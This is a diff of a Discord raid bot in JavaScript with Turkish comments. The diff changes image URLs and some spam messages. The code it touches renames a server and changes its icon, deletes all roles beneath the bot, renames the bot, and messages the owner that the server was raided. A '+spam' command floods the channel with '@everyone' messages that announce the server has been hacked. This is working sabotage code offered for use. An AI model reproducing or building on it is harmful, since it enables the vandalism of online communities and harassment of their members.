@@ -1249,10 +1249,10 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://i.hizliresim.com/MpAB0o.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setIcon("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     await msg.guild.setName("AxxA Baskın Attı"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setAvatar("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     await client.user.setUsername("AxxA Yok Et.");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan Heyyo**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
@@ -1460,9 +1460,9 @@ client.on("message", async msg => {
 client.on('message', msg => {
   if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
         msg.channel.send('**Bu Sunucu AxxA Tarafından Saldırıya Maruz Bırakılmıştır.** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**Hiçbirşey Karşılıksız Kalmaz Kalamaz. - AxxA** @everyone :wink: :heart:'); 
+        msg.channel.send('**Bana Nasıl Davranıyorsan Sana O Şekilde Yaklaşırım - AxxA** @everyone :wink: :heart:'); 
+        msg.channel.send('**AxxA Uğradı.** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
